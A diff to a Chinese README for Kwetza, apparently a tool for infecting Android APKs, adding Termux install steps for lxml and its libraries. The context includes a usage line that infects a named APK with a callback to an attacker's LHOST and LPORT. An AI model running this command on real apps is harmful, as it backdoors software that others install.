@@ -27,6 +27,15 @@ Kwetza用Python编写，需要BeautifulSoup，可以使用pip安装：
 pip install beautifulsoup4
 ```
 Kwetza要求安装Apktool并可以通过您的PATH访问。可以使用位于此处的安装说明进行设置：https://ibotpeaches.github.io/Apktool/install
+
+安装lxml解释器：<br>
+使用Termux安装lxml需要先安装好依赖环境<br>
+<br>
+1.libxml2<br>
+2.libxslt<br>
+3.libiconv<br>
+<br>
+使用apt-get安装以上包，然后再执行pip install lxml即可<br>
 # 用法
 ```
 python kwetza.py nameOfTheApkToInfect.apk https/tcp LHOST LPORT yes/no customClass
